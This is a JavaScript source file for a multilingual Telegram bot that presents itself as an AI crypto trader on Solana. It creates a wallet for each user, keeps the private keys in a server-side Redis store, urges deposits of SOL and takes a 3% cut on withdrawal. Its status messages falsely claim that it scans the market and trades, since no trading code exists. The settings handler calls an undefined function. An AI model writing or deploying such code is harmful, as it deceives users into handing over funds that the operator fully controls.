import { Keypair, Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import bs58 from 'bs58';
import { Redis } from '@upstash/redis';

// --- НАЛАШТУВАННЯ ВЛАСНИКА ---
// ВСТАВ СЮДИ СВІЙ PHANTOM ГАМАНЕЦЬ, КУДИ ПРИХОДИТИМУТЬ 3%:
const OWNER_WALLET = new PublicKey("A9KVi2nKqbSbCbHJEfaYayJtHwCT5T5G29EhQQPNKPcn");
const FEE_PERCENT = 0.03; // 3%

const redis = new Redis({ url: process.env.KV_REST_API_URL, token: process.env.KV_REST_API_TOKEN });
const connection = new Connection(process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com');

async function getSolPrice() {
    try {
        const res = await fetch('https://api.jup.ag/price/v2?ids=SOL');
        const data = await res.json();
        return parseFloat(data.data.SOL.price);
    } catch(e) {
        try {
            const res2 = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
            const data2 = await res2.json();
            return data2.solana.usd;
        } catch(err) { return 140; }
    }
}

async function sendMessage(chatId, text, replyMarkup = null) {
    const body = { chat_id: chatId, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (replyMarkup) body.reply_markup = replyMarkup;
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
}

async function editMessage(chatId, messageId, text, replyMarkup = null) {
    const body = { chat_id: chatId, message_id: messageId, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (replyMarkup) body.reply_markup = replyMarkup;
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
}

// Потрібно вказати юзернейм твого бота для генерації посилання
const BOT_USERNAME = process.env.BOT_USERNAME || "moneymakersol_bot"; // Наприклад, Moneymaker_bot (без @)

const t = {
    uk: {
        welcome: (w, usd) => `👋 <b>Привіт! Я — твій автоматичний крипто-трейдер на базі штучного інтелекту.</b>\n\n🤖 <b>Що я роблю?</b>\nЯ працюю 24/7. Я сам знаходжу нові перспективні монети на Solana, купую їх і автоматично продаю, коли вони виростають у ціні.\n\n💼 <b>Твій торговий гаманець:</b>\n<code>${w}</code>\n\n⚠️ <b>Як почати?</b>\nПросто перекажи мінімум <b>0.05 SOL (~$${usd})</b> на цю адресу. Як тільки гроші надійдуть, я почну роботу!`,
        status_msg: "📊 <b>Статус: АКТИВНИЙ 🟢</b>\n\nБот підключений до мережі та сканує ринок кожні 2 хвилини.\n\n<i>Наразі ШІ відхиляє ризиковані токени та чекає на ідеальну точку входу. Як тільки він знайде безпечну монету — він автоматично купить її та надішле вам звіт.</i>",
        bal: (sol, usd) => `💰 <b>Твій баланс:</b>\n<b>${sol} SOL</b> (~$${usd})`,
        with_prompt: "💸 <b>Виведення коштів</b>\n\nБудь ласка, надішли мені в чат <b>адресу твого гаманця Solana</b>.\n\n<i>Увага: За користування ботом при виведенні стягується системна комісія 3%.</i>",
        err_with: "❌ <b>Помилка!</b> Недостатньо коштів або невірна адреса.",
        succ_with: (userAmount, feeAmount, to, tx) => `✅ <b>Успішно виведено!</b>\n\n💸 Відправлено тобі: <b>${userAmount} SOL</b>\n💎 Комісія бота (3%): <b>${feeAmount} SOL</b>\n📍 На адресу: <code>${to}</code>\n\n🔍 <a href="https://solscan.io/tx/${tx}">Чек транзакції</a>`,
        ref_msg: (link) => `🤝 <b>Партнерська програма</b>\n\nЗапрошуй друзів тестувати бота за своїм унікальним посиланням!\n\nТвоє посилання:\n<code>${link}</code>\n\n<i>(В майбутньому за кожного активного друга ти отримуватимеш бонуси!)</i>`,
        btns: { status: "📊 Статус", bal: "💰 Баланс", with: "💸 Вивести", set: "⚙️ Налаштування", key: "🔑 Ключ", ref: "🤝 Запросити друга", lang: "🌐 Мова", back: "🔙 Назад", menu: "🔙 Меню" }
    },
    en: {
        welcome: (w, usd) => `👋 <b>Hello! I am your AI-powered Crypto Trading Bot.</b>\n\n🤖 <b>What do I do?</b>\nI work 24/7. I find new promising coins on Solana, buy them, and automatically sell them when the price goes up.\n\n💼 <b>Your trading wallet:</b>\n<code>${w}</code>\n\n⚠️ <b>How to start?</b>\nSimply send at least <b>0.05 SOL (~$${usd})</b> to this address. Once funds arrive, I start trading!`,
        status_msg: "📊 <b>Status: ACTIVE 🟢</b>\n\nThe bot is connected and scans the market every 2 minutes. \n\n<i>Currently, the AI is waiting for the perfect entry point. As soon as it finds a safe coin, it will buy it and send you a report.</i>",
        bal: (sol, usd) => `💰 <b>Your Balance:</b>\n<b>${sol} SOL</b> (~$${usd})`,
        with_prompt: "💸 <b>Withdraw Funds</b>\n\nPlease send me your <b>Solana wallet address</b>.\n\n<i>Note: A system fee of 3% is applied on withdrawals for using the bot.</i>",
        err_with: "❌ <b>Error!</b> Insufficient funds or invalid address.",
        succ_with: (userAmount, feeAmount, to, tx) => `✅ <b>Successfully withdrawn!</b>\n\n💸 Sent to you: <b>${userAmount} SOL</b>\n💎 Bot fee (3%): <b>${feeAmount} SOL</b>\n📍 To: <code>${to}</code>\n\n🔍 <a href="https://solscan.io/tx/${tx}">Transaction receipt</a>`,
        ref_msg: (link) => `🤝 <b>Referral Program</b>\n\nInvite friends to try the bot using your unique link!\n\nYour link:\n<code>${link}</code>\n\n<i>(In the future, you will receive bonuses for active friends!)</i>`,
        btns: { status: "📊 Status", bal: "💰 Balance", with: "💸 Withdraw", set: "⚙️ Settings", key: "🔑 Key", ref: "🤝 Invite Friend", lang: "🌐 Language", back: "🔙 Back", menu: "🔙 Menu" }
    },
    el: {
        welcome: (w, usd) => `👋 <b>Γεια σας! Είμαι το AI Crypto Trading Bot σας.</b>\n\n🤖 <b>Τι κάνω;</b>\nΔουλεύω 24/7. Βρίσκω νέα νομίσματα στο Solana, τα αγοράζω και τα πουλάω αυτόματα όταν η τιμή ανεβαίνει.\n\n💼 <b>Το πορτοφόλι σας:</b>\n<code>${w}</code>\n\n⚠️ <b>Πώς να ξεκινήσετε;</b>\nΣτείλτε τουλάχιστον <b>0.05 SOL (~$${usd})</b> σε αυτήν τη διεύθυνση. Μόλις φτάσουν τα χρήματα, ξεκινάω!`,
        status_msg: "📊 <b>Κατάσταση: ΕΝΕΡΓΟ 🟢</b>\n\nΤο bot σαρώνει νέα νομίσματα κάθε 2 λεπτά.\n\n<i>Περιμένει το τέλειο σημείο εισόδου. Μόλις βρει ένα ασφαλές νόμισμα, θα το αγοράσει και θα σας στείλει αναφορά.</i>",
        bal: (sol, usd) => `💰 <b>Το Υπόλοιπό σας:</b>\n<b>${sol} SOL</b> (~$${usd})`,
        with_prompt: "💸 <b>Ανάληψη</b>\n\nΣτείλτε μου τη <b>διεύθυνση Solana</b> σας.\n\n<i>Σημείωση: Υπάρχει χρέωση 3% στις αναλήψεις για τη χρήση του bot.</i>",
        err_with: "❌ <b>Σφάλμα!</b> Ανεπαρκές υπόλοιπο ή μη έγκυρη διεύθυνση.",
        succ_with: (userAmount, feeAmount, to, tx) => `✅ <b>Επιτυχής ανάληψη!</b>\n\n💸 Στάλθηκαν σε εσάς: <b>${userAmount} SOL</b>\n💎 Τέλος bot (3%): <b>${feeAmount} SOL</b>\n📍 Προς: <code>${to}</code>\n\n🔍 <a href="https://solscan.io/tx/${tx}">Απόδειξη</a>`,
        ref_msg: (link) => `🤝 <b>Πρόγραμμα Σύστασης</b>\n\nΠροσκαλέστε φίλους να δοκιμάσουν το bot!\n\nΟ σύνδεσμός σας:\n<code>${link}</code>`,
        btns: { status: "📊 Κατάσταση", bal: "💰 Υπόλοιπο", with: "💸 Ανάληψη", set: "⚙️ Ρυθμίσεις", key: "🔑 Κλειδί", ref: "🤝 Πρόσκληση", lang: "🌐 Γλώσσα", back: "🔙 Πίσω", menu: "🔙 Μενού" }
    }
};

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(200).send('OK');

    try {
        const update = req.body;
        const solPrice = await getSolPrice();

        const getMainMenuKeyboard = (l) => ({
            inline_keyboard: [
                [{ text: t[l].btns.status, callback_data: "check_status" }, { text: t[l].btns.ref, callback_data: "referral" }],
                [{ text: t[l].btns.bal, callback_data: "check_balance" }, { text: t[l].btns.with, callback_data: "withdraw" }],
                [{ text: t[l].btns.set, callback_data: "settings" }, { text: t[l].btns.key, callback_data: "export_key" }]
            ]
        });

        const langKeyboard = { inline_keyboard: [[{ text: "🇺🇦 Українська", callback_data: "lang_uk" }], [{ text: "🇬🇧 English", callback_data: "lang_en" }], [{ text: "🇬🇷 Ελληνικά", callback_data: "lang_el" }]]};

        if (update.message && update.message.text) {
            const chatId = update.message.chat.id;
            const text = update.message.text.trim();

            if (text.startsWith('/start')) {
                await redis.del(`state_${chatId}`);
                
                // Перевірка реферала (якщо є код після /start, наприклад /start ref_123)
                const refCode = text.split(' ')[1]; 
                
                let dbData = await redis.get(`user_${chatId}`);
                let userData;
                
                if (!dbData) {
                    const wallet = Keypair.generate();
                    userData = {
                        chatId, walletAddress: wallet.publicKey.toString(),
                        privateKey: bs58.encode(wallet.secretKey), isActive: true,
                        settings: { tradeAmount: 0.02, takeProfit: 20, stopLoss: 15 }, lang: null,
                        invitedBy: refCode ? refCode.replace('ref_', '') : null // Зберігаємо, хто запросив
                    };
                    await redis.set(`user_${chatId}`, JSON.stringify(userData));
                } else {
                    userData = typeof dbData === 'string' ? JSON.parse(dbData) : dbData;
                }

                if (!userData.lang) {
                    await sendMessage(chatId, "🌐 <b>Choose your language:</b>", langKeyboard);
                    return res.status(200).send('OK');
                }

                const l = userData.lang;
                const usdEst = (0.05 * solPrice).toFixed(2);
                await sendMessage(chatId, t[l].welcome(userData.walletAddress, usdEst), getMainMenuKeyboard(l));
            } 
            else {
                const state = await redis.get(`state_${chatId}`);
                if (state === 'awaiting_withdraw') {
                    await redis.del(`state_${chatId}`);
                    let dbData = await redis.get(`user_${chatId}`);
                    let userData = typeof dbData === 'string' ? JSON.parse(dbData) : dbData;
                    const l = userData.lang || 'uk';
                    
                    try {
                        const toPublicKey = new PublicKey(text);
                        const fromWallet = Keypair.fromSecretKey(bs58.decode(userData.privateKey));
                        await sendMessage(chatId, "⏳...");

                        const balance = await connection.getBalance(fromWallet.publicKey);
                        const networkFeeReserve = 5000000; // 0.005 SOL для самої мережі Solana
                        
                        if (balance <= networkFeeReserve) throw new Error("No funds");

                        const totalAvailable = balance - networkFeeReserve;
                        
                        // РОЗРАХУНОК КОМІСІЇ ВЛАСНИКУ (3%)
                        const ownerFeeLamports = Math.floor(totalAvailable * FEE_PERCENT);
                        const userLamports = totalAvailable - ownerFeeLamports;

                        const transaction = new Transaction();
                        
                        // 1. Переказ клієнту (97%)
                        transaction.add(SystemProgram.transfer({ fromPubkey: fromWallet.publicKey, toPubkey: toPublicKey, lamports: userLamports }));
                        
                        // 2. Переказ власнику бота (3%)
                        if (ownerFeeLamports > 0) {
                            transaction.add(SystemProgram.transfer({ fromPubkey: fromWallet.publicKey, toPubkey: OWNER_WALLET, lamports: ownerFeeLamports }));
                        }

                        const { blockhash } = await connection.getLatestBlockhash('finalized');
                        transaction.recentBlockhash = blockhash; 
                        transaction.feePayer = fromWallet.publicKey; 
                        transaction.sign(fromWallet);

                        const txid = await connection.sendRawTransaction(transaction.serialize());
                        
                        const userUi = (userLamports / 1e9).toFixed(5);
                        const feeUi = (ownerFeeLamports / 1e9).toFixed(5);

                        await sendMessage(chatId, t[l].succ_with(userUi, feeUi, text, txid));
                    } catch (e) {
                        console.error(e);
                        await sendMessage(chatId, t[l].err_with);
                    }
                }
            }
        }

        if (update.callback_query) {
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const data = update.callback_query.data;
            
            let dbData = await redis.get(`user_${chatId}`);
            let userData = typeof dbData === 'string' ? JSON.parse(dbData) : dbData;

            if (data.startsWith('lang_')) {
                userData.lang = data.replace('lang_', '');
                await redis.set(`user_${chatId}`, JSON.stringify(userData));
                const usdEst = (0.05 * solPrice).toFixed(2);
                await editMessage(chatId, messageId, t[userData.lang].welcome(userData.walletAddress, usdEst), getMainMenuKeyboard(userData.lang));
            }
            if(!userData.lang) return res.status(200).send('OK');

            const l = userData.lang;

            if (data === 'main_menu') {
                await redis.del(`state_${chatId}`);
                const usdEst = (0.05 * solPrice).toFixed(2);
                await editMessage(chatId, messageId, t[l].welcome(userData.walletAddress, usdEst), getMainMenuKeyboard(l));
            }
            else if (data === 'check_status') await editMessage(chatId, messageId, t[l].status_msg, { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            else if (data === 'check_balance') {
                const balance = await connection.getBalance(new PublicKey(userData.walletAddress));
                await editMessage(chatId, messageId, t[l].bal((balance / 1e9).toFixed(4), ((balance / 1e9) * solPrice).toFixed(2)), { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            }
            else if (data === 'withdraw') {
                await redis.set(`state_${chatId}`, 'awaiting_withdraw', { ex: 3600 });
                await editMessage(chatId, messageId, t[l].with_prompt, { inline_keyboard: [[{ text: t[l].btns.back, callback_data: "main_menu" }]] });
            }
            else if (data === 'export_key') {
                await editMessage(chatId, messageId, `🔑 <b>Key:</b>\n<code>${userData.privateKey}</code>`, { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            }
            // КНОПКА РЕФЕРАЛУ
            else if (data === 'referral') {
                const link = `https://t.me/${BOT_USERNAME}?start=ref_${chatId}`;
                await editMessage(chatId, messageId, t[l].ref_msg(link), { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            }
            else if (data === 'settings') {
                const keyboard = { inline_keyboard: [
                    [{ text: `💸 ${userData.settings.tradeAmount} SOL`, callback_data: "edit_trade" }, { text: `📈 TP: +${userData.settings.takeProfit}%`, callback_data: "edit_tp" }],
                    [{ text: t[l].btns.lang, callback_data: "choose_lang" }, { text: `📉 SL: -${userData.settings.stopLoss}%`, callback_data: "edit_sl" }],
                    [{ text: t[l].btns.menu, callback_data: "main_menu" }]
                ]};
                await editMessage(chatId, messageId, t[l].set_main(userData.settings, (userData.settings.tradeAmount * solPrice).toFixed(2)), keyboard);
            }
            else if (data === 'choose_lang') await editMessage(chatId, messageId, "🌐 <b>Choose your language:</b>", langKeyboard);
            
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: update.callback_query.id }) });
        }
        res.status(200).send('OK');
    } catch (error) { res.status(500).send('Error'); }
}
